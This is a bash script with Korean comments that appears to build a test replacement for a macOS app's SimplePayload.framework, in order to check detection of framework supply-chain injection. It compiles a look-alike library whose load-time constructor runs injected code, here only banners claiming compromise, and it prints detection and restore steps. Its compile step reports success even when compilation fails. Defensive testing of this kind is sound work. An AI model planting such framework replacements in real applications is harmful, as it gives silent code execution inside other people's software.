#!/bin/bash

##############################################################################
# create_malicious_payload_type_b.sh
#
# Type B (Framework 공급망) 주입 검증용 악성 Framework 생성
# 정상 SimplePayload.framework를 악성 버전으로 교체
#
# 사용:
# ./create_malicious_payload_type_b.sh /path/to/TestApp
##############################################################################

set -e

if [ $# -ne 1 ]; then
    echo "Usage: $0 /path/to/TestApp"
    echo ""
    echo "Example:"
    echo "  $0 ./TestApp"
    exit 1
fi

APP_PATH="$1"
FRAMEWORK_PATH="$APP_PATH/Contents/Frameworks/SimplePayload.framework/Versions/A"
BACKUP_PATH="$APP_PATH/Contents/Frameworks/SimplePayload.framework/Versions/A.backup"

echo "╔════════════════════════════════════════════════════════╗"
echo "║   Type B 악성 Framework 생성 (SimplePayload 교체)    ║"
echo "╚════════════════════════════════════════════════════════╝"
echo ""

# Step 1: 백업
echo "[Step 1] 정상 Framework 백업"
if [ -f "$FRAMEWORK_PATH/SimplePayload" ]; then
    mkdir -p "$BACKUP_PATH"
    cp "$FRAMEWORK_PATH/SimplePayload" "$BACKUP_PATH/SimplePayload.backup"
    echo "  [✓] 백업 완료: $BACKUP_PATH/SimplePayload.backup"
else
    echo "  [✗] Framework 바이너리 없음: $FRAMEWORK_PATH/SimplePayload"
    exit 1
fi
echo ""

# Step 2: 악성 Framework 생성
echo "[Step 2] 악성 Framework 바이너리 생성"
MALICIOUS_C=$(mktemp)

cat > "$MALICIOUS_C" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

/**
 * 악성 SimplePayload.framework
 * 정상 함수를 제공하지만 constructor에서 악성 코드 실행
 */

void simple_payload_init(void) {
    printf("[SimplePayload] Initializing...\n");
}

void simple_payload_process(const char *data) {
    if (!data) return;
    printf("[SimplePayload] Processing: %s\n", data);
}

const char* simple_payload_version(void) {
    return "1.0.0";
}

/**
 * ★ 악성 코드 실행 지점
 */
__attribute__((constructor))
void simple_payload_constructor(void) {
    printf("\n");
    printf("╔════════════════════════════════════════════════════╗\n");
    printf("║     ⚠️  악성 SimplePayload.framework 실행!        ║\n");
    printf("║     Type B 공급망 공격 성공!                     ║\n");
    printf("╚════════════════════════════════════════════════════╝\n");
    printf("\n");
    
    printf("[!] 악성 코드 실행:\n");
    printf("    - Framework 교체 감지\n");
    printf("    - Constructor 실행 시점: %s\n", __TIMESTAMP__);
    printf("    - PID: %d\n", getpid());
    printf("    - 권한: 앱과 동일\n");
    printf("    - 탐지 난이도: 높음 (Framework는 일반적으로 변경 감시 대상 아님)\n");
    printf("\n");
    
    printf("[!] 공격 가능 범위:\n");
    printf("    - 앱의 모든 메모리 접근 가능\n");
    printf("    - 사용자 데이터 탈취 가능\n");
    printf("    - 시스템 명령 실행 가능\n");
    printf("    - 다른 Framework/dylib과 상호작용 가능\n");
    printf("\n");
    
    printf("[!] 이 앱을 사용하는 12개 앱 모두 동시 침해 가능:\n");
    printf("    1. Maccy\n");
    printf("    2. Rectangle\n");
    printf("    3. Keka\n");
    printf("    ... (9개 더)\n");
    printf("\n");
    
    printf("[SimplePayload] Version: %s\n", simple_payload_version());
    simple_payload_init();
}

__attribute__((destructor))
void simple_payload_destructor(void) {
    printf("[SimplePayload] Destructor called\n");
}
EOF

echo "  [*] 악성 Framework C 코드 생성"

# 컴파일
gcc -shared -fPIC -x c -o "$FRAMEWORK_PATH/SimplePayload" "$MALICIOUS_C" 2>&1 || true
rm -f "$MALICIOUS_C"

echo "  [✓] 악성 Framework 컴파일 완료"
echo "  [✓] 위치: $FRAMEWORK_PATH/SimplePayload"
echo ""

# Step 3: 검증
echo "[Step 3] 악성 Framework 검증"
if file "$FRAMEWORK_PATH/SimplePayload" | grep -q "shared object"; then
    echo "  [✓] 유효한 dylib 형식 확인"
fi

if nm "$FRAMEWORK_PATH/SimplePayload" | grep -q simple_payload; then
    echo "  [✓] 심볼 확인 (simple_payload_* 함수 존재)"
fi
echo ""

# Step 4: 사용 설명
echo "[Step 4] 검증 방법"
echo "  1. TestApp 실행:"
echo "     $ $APP_PATH"
echo ""
echo "  2. 출력에서 확인:"
echo "     ⚠️  악성 SimplePayload.framework 실행!"
echo "     Type B 공급망 공격 성공!"
echo ""
echo "  3. dylib_loader로 검증:"
echo "     $ ./dylib_loader report.txt"
echo "     → Type B 주입 검증 선택"
echo "     → 악성 Framework 감지 및 보고"
echo ""

# Step 5: 원래대로 복구
echo "[Step 5] 원래대로 복구하는 방법"
echo "  $ cp $BACKUP_PATH/SimplePayload.backup $FRAMEWORK_PATH/SimplePayload"
echo ""

echo "╔════════════════════════════════════════════════════════╗"
echo "║         Type B 악성 Framework 생성 완료! ✓            ║"
echo "╚════════════════════════════════════════════════════════╝"
echo ""
